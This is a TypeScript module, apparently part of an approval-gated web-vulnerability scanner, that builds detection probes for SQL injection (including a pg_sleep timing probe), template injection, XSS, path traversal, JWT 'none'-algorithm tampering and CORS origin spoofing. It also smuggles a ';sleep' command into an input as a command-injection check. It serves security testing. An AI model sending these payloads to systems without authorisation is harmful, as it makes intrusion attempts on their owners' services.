import type { HuntFamily } from "./policy";

/** Methodology only; no downloaded payload lists or runtime external dependency. */
export const PATT_COMMIT = "3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a";
export const PROBE_RISKS = ["SAFE", "LOW_IMPACT", "REQUIRES_APPROVAL", "FORBIDDEN_AUTOMATIC"] as const;
export type ProbeRisk = typeof PROBE_RISKS[number];
export type ProbeEncoding = "URL" | "DOUBLE_URL" | "MIXED_URL" | "UNICODE" | "NONE";
export interface PayloadVariant {
  id: string; technique: string; family: HuntFamily; risk: ProbeRisk;
  encoding: ProbeEncoding; prerequisites: readonly string[];
  confirmation: string; expectedSignal: string; sourceSection: string;
  build(value: string, marker: string, alternate?: boolean): string;
}
function mutateJwt(token: string, marker: string, kind: string): string {
  const [encodedHeader, payload, signature = ""] = token.split(".");
  if (kind === "signature-a" || kind === "signature-c") {
    const ch = kind === "signature-a" ? "A" : "C";
    return `${encodedHeader}.${payload}.${signature[0] === ch ? "Z" : ch}${signature.slice(1)}`;
  }
  const header = JSON.parse(Buffer.from(encodedHeader, "base64url").toString());
  const changed = kind === "missing-kid" ? { ...header, kid: `bh-missing-${marker}` } : { ...header, alg: kind === "none-lower" ? "none" : "None" };
  return `${Buffer.from(JSON.stringify(changed)).toString("base64url")}.${payload}.${kind === "missing-kid" ? signature : ""}`;
}
const variant = (v: PayloadVariant): Readonly<PayloadVariant> => Object.freeze(v);
export const PAYLOAD_VARIANTS = [
  variant({ id: "sql.quote", technique: "sqli.error-differential", family: "sqli", risk: "SAFE", encoding: "URL", prerequisites: ["READ_ONLY_QUERY"], confirmation: "REPEATED_DBMS_ERROR_AND_INERT_CONTROL", expectedSignal: "DBMS error absent from controls", sourceSection: "SQL Injection/README.md#entry-point-detection", build: value => `${value}'` }),
  variant({ id: "sql.numeric", technique: "sqli.boolean-differential", family: "sqli", risk: "SAFE", encoding: "URL", prerequisites: ["NUMERIC_INPUT"], confirmation: "PAIRED_BOOLEAN_AND_INDEPENDENT_DB_ERROR", expectedSignal: "Stable content difference without status/type change", sourceSection: "SQL Injection/README.md#boolean-based-injection", build: (value, _marker, alternate) => `${value} AND 1=${alternate ? 2 : 1}` }),
  variant({ id: "sql.string", technique: "sqli.boolean-differential", family: "sqli", risk: "SAFE", encoding: "URL", prerequisites: ["STRING_INPUT"], confirmation: "PAIRED_BOOLEAN_AND_INDEPENDENT_DB_ERROR", expectedSignal: "Stable content difference without broadening original filter", sourceSection: "SQL Injection/README.md#boolean-based-injection", build: (value, _marker, alternate) => `${value}' AND '1'='${alternate ? 2 : 1}` }),
  variant({ id: "sql.comment", technique: "sqli.boolean-differential", family: "sqli", risk: "SAFE", encoding: "URL", prerequisites: ["NUMERIC_INPUT", "DBMS_FINGERPRINT"], confirmation: "PAIRED_BOOLEAN_AND_INDEPENDENT_DB_ERROR", expectedSignal: "Comment whitespace accepted by identified DBMS", sourceSection: "SQL Injection/README.md#no-space-allowed", build: (value, _marker, alternate) => `${value}/**/AND/**/1=${alternate ? 2 : 1}` }),
  ...(["curly", "dollar", "hash", "ejs"] as const).map(syntax => variant({ id: `ssti.${syntax}`, technique: "ssti.arithmetic-differential", family: "ssti", risk: "SAFE", encoding: "URL", prerequisites: syntax === "ejs" ? ["NODE_OR_RUBY_HINT"] : syntax === "hash" ? ["JAVA_HINT"] : ["READ_ONLY_QUERY"], confirmation: "TWO_ARITHMETIC_RESULTS_REPEAT_BASELINE_INERT", expectedSignal: "Framed 49 and 64 evaluated without literal expression", sourceSection: "Server Side Template Injection/README.md#universal-detection-payloads", build: (_value, marker, alternate) => {
    const expr = alternate ? "8*8" : "7*7";
    const wrapped = syntax === "curly" ? `{{${expr}}}` : syntax === "dollar" ? `\${${expr}}` : syntax === "hash" ? `#{${expr}}` : `<%= ${expr} %>`;
    return `${marker}${wrapped}${marker}`;
  } })),
  ...(["html", "attribute", "javascript"] as const).map(context => variant({ id: `xss.${context}`, technique: "xss.browser-confirmation", family: "xss", risk: "SAFE", encoding: "URL", prerequisites: ["READ_ONLY_QUERY", "CONFINED_BROWSER"], confirmation: "DIALOG_EXECUTION_WITH_INERT_CANARY_CONTROL", expectedSignal: "Exact canary dialog only with executable syntax", sourceSection: "XSS Injection/README.md#xss-in-htmlapplications", build: (_value, marker) => context === "html" ? `<svg onload=alert('${marker}')>` : context === "attribute" ? `\"><svg onload=alert('${marker}')>` : `';alert('${marker}');//` })),
  ...(["plain", "double", "mixed", "mangled", "unicode", "java"] as const).map(encoding => variant({ id: `path.${encoding}`, technique: "lfi.path-error-differential", family: "lfi", risk: "SAFE", encoding: encoding === "double" ? "DOUBLE_URL" : encoding === "mixed" ? "MIXED_URL" : encoding === "unicode" ? "UNICODE" : "URL", prerequisites: encoding === "unicode" ? ["IIS_HINT"] : encoding === "java" ? ["TOMCAT_HINT"] : ["FILE_QUERY"], confirmation: "REPEAT_ERROR_BASELINE_INERT_ONLY_CANDIDATE", expectedSignal: "Path parser error, never file contents or traversal proof", sourceSection: "Directory Traversal/README.md#methodology", build: (_value, marker) => {
    const prefix = { plain: "../", double: "%2e%2e%2f", mixed: ".%2e/", mangled: "....//", unicode: "%u002e%u002e%u2215", java: "..;/" }[encoding];
    return `${prefix}bh_missing_${marker}.txt`;
  } })),
  variant({ id: "sql.delay", technique: "sqli.timing-screen", family: "sqli", risk: "REQUIRES_APPROVAL", encoding: "URL", prerequisites: ["EXPLICIT_TIMING_APPROVAL", "NUMERIC_INPUT"], confirmation: "INTERLEAVED_1S_2S_PAIRS_CONTENT_JITTER", expectedSignal: "Delay tracks two fixed bounded durations", sourceSection: "SQL Injection/README.md#time-based-injection", build: (value, seconds) => `${value} AND (SELECT 1 FROM pg_sleep(${seconds === "2" ? 2 : seconds === "1" ? 1 : 0}))=1` }),
  variant({ id: "cmd.delay", technique: "cmdi.timing-screen", family: "command-injection", risk: "REQUIRES_APPROVAL", encoding: "URL", prerequisites: ["EXPLICIT_TIMING_APPROVAL", "COMMAND_SHAPED_INPUT"], confirmation: "INTERLEAVED_1S_2S_PAIRS_CONTENT_JITTER", expectedSignal: "Delay tracks two fixed bounded durations", sourceSection: "Command Injection/README.md#chaining-commands", build: (value, seconds) => `${value};sleep ${seconds === "2" ? 2 : seconds === "1" ? 1 : 0}` }),
  ...(["signature-a", "signature-c", "none-lower", "none-title", "missing-kid"] as const).map(kind => variant({ id: `jwt.${kind}`, technique: kind === "missing-kid" ? "jwt.key-selection-review" : kind.startsWith("none") ? "jwt.algorithm-differential" : "jwt.validation-differential", family: "jwt", risk: "SAFE", encoding: "NONE", prerequisites: ["TEST_JWT", "ISOLATED_AUTHENTICATED_OBJECT"], confirmation: kind === "missing-kid" ? "CANDIDATE_ONLY" : "TWO_INVALID_TOKENS_REPEAT_ANONYMOUS_CONTROL", expectedSignal: "Original test identity retains matching content under invalid token", sourceSection: "JSON Web Token/README.md#jwt-signature", build: (value, marker) => mutateJwt(value, marker, kind) })),
  ...(["foreign", "null", "suffix", "prefix", "scheme", "port", "subdomain", "unescaped-dot"] as const).map(kind => variant({ id: `cors.${kind}`, technique: "cors.origin-matrix", family: "cors", risk: "SAFE", encoding: "NONE", prerequisites: ["HTTP_ENDPOINT"], confirmation: "HEADERS_ONLY_CANDIDATE_BROWSER_IMPACT_REQUIRED", expectedSignal: "Origin reflection or wildcard acceptance", sourceSection: "CORS Misconfiguration/README.md#methodology", build: value => {
    const u = new URL(value), host = u.hostname;
    return { foreign: "https://bh-origin.example.invalid", null: "null", suffix: `https://${host}.example.invalid`, prefix: `https://bh-${host}`, scheme: `${u.protocol === "https:" ? "http:" : "https:"}//${u.host}`, port: `${u.protocol}//${host}:${u.port === "8443" ? "9443" : "8443"}`, subdomain: `${u.protocol}//bh.${u.host}`, "unescaped-dot": `${u.protocol}//${host.replace(".", "x")}` }[kind];
  } })),
] as const;
export function payloadVariant(id: string): Readonly<PayloadVariant> {
  const v = PAYLOAD_VARIANTS.find(v => v.id === id);
  if (!v) throw new Error("UNKNOWN_PAYLOAD_VARIANT");
  return v;
}
/** One URLSearchParams encoding layer: double/mixed probes contain literal %xx. */
export function queryProbeUrl(url: string, key: string, value: string): string {
  const u = new URL(url); u.searchParams.set(key, value); return u.toString();
}
export function corsOrigins(url: string): string[] {
  return [...new Set(PAYLOAD_VARIANTS.filter(v => v.technique === "cors.origin-matrix").map(v => v.build(url, "")))].slice(0, 8);
}
export function sstiVariants(technologies: readonly string[]): string[] {
  if (technologies.some(t => /express|node|rails|ruby/i.test(t))) return ["ssti.ejs", "ssti.curly"];
  if (technologies.some(t => /tomcat|jetty|java|spring/i.test(t))) return ["ssti.dollar", "ssti.hash"];
  return ["ssti.curly", "ssti.dollar"];
}
